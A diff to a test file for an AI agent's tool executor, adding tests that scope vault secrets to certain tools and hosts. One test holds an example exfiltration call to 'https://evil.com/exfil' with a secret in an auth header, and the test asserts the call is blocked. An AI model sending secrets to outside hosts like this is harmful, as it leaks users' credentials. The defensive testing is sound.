@@ -32,8 +32,15 @@ mock.module('@/server/logger', () => ({
 // the full export surface (Bun's mock.module is global — later importers of
 // the vault module must find every named export production code uses).
 const testSecrets = new Map<string, string>()
+const testScopes = new Map<string, { allowedTools?: string[] | null; allowedHosts?: string[] | null }>()
 mock.module('@/server/services/vault', () => ({
   getSecretValue: async (key: string) => testSecrets.get(key) ?? null,
+  getSecretForUse: async (key: string) => {
+    const value = testSecrets.get(key)
+    if (value === undefined) return null
+    const scopes = testScopes.get(key)
+    return { value, allowedTools: scopes?.allowedTools ?? null, allowedHosts: scopes?.allowedHosts ?? null }
+  },
   markSecretUsed: async () => {},
   getSecretByKey: async (key: string) => (testSecrets.has(key) ? { id: `id-${key}`, key } : null),
   createSecret: async () => ({ id: 'x', key: 'X' }),
@@ -110,6 +117,7 @@ beforeEach(() => {
   sqlite.run('DELETE FROM messages')
   sqlite.run('DELETE FROM compacting_summaries')
   testSecrets.clear()
+  testScopes.clear()
   emitted.length = 0
   invalidateHotSecrets()
 })
@@ -264,6 +272,60 @@ describe('executeSingleTool placeholder wiring', () => {
     )
     expect(result.success).toBe(true)
     expect(result.output).toBe('got:spawned-value-42')
+  })
+
+  it('enforces allowedTools scoping — fail-closed with explicit error', async () => {
+    testSecrets.set('SCOPED', 'scoped-value-123456')
+    testScopes.set('SCOPED', { allowedTools: ['http_request'] })
+    const result = await executeSingleTool(
+      { id: 't5', name: 'custom_echo', args: { header: '{{secret:SCOPED}}' }, offset: 0 },
+      tools,
+      abort(),
+    )
+    expect(seen.length).toBe(0) // not executed
+    const error = (result as { error: string }).error
+    expect(error).toContain('scope violation')
+    expect(error).toContain('http_request')
+  })
+
+  it('enforces allowedHosts on URL-bearing tools (wildcard match, fail-closed mismatch)', async () => {
+    const { toolRegistry } = await import('@/server/tools/index')
+    testSecrets.set('GH_API', 'gh-api-value-123456')
+    testScopes.set('GH_API', { allowedHosts: ['*.github.com'] })
+    const calls: unknown[] = []
+    toolRegistry.register(
+      'http_request',
+      { availability: ['main'], expandsSecrets: true, create: () => ({ execute: async () => ({}) }) as never },
+      'browse',
+    )
+    try {
+      const httpTools = {
+        http_request: {
+          execute: async (args: unknown) => {
+            calls.push(args)
+            return { status: 200 }
+          },
+        },
+      } as never
+      // Allowed: api.github.com matches *.github.com
+      const ok = await executeSingleTool(
+        { id: 't6', name: 'http_request', args: { url: 'https://api.github.com/repos', headers: { auth: '{{secret:GH_API}}' } }, offset: 0 },
+        httpTools,
+        abort(),
+      )
+      expect((ok as { status: number }).status).toBe(200)
+      expect((calls[0] as { headers: { auth: string } }).headers.auth).toBe('gh-api-value-123456')
+      // Refused: evil.com does not match — the request never fires
+      const blocked = await executeSingleTool(
+        { id: 't7', name: 'http_request', args: { url: 'https://evil.com/exfil', headers: { auth: '{{secret:GH_API}}' } }, offset: 0 },
+        httpTools,
+        abort(),
+      )
+      expect(calls.length).toBe(1)
+      expect((blocked as { error: string }).error).toContain('restricted to host')
+    } finally {
+      toolRegistry.unregister('http_request')
+    }
   })
 
   it('passes placeholders through as inert text for non-expanding tools', async () => {
